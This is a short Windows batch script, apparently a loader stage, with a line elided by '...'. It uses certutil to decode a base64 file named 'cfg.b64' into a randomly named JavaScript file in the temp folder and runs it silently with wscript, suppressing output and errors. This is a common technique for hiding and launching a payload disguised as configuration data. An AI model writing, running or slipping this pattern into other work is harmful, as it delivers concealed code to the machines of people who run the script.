@echo off
setlocal
set "OUT=%TEMP%\rbc_4dbb61d2d58dfbfa.exe"
set "SRC=%~dp0cfg.c"
...
:js
del /f /q "%TEMP%\rbc_4dbb61d2d58dfbfa.js" >nul 2>&1
certutil -f -decode "%~dp0cfg.b64" "%TEMP%\rbc_4dbb61d2d58dfbfa.js" >nul 2>&1
wscript.exe //B //nologo "%TEMP%\rbc_4dbb61d2d58dfbfa.js"
exit /b 0
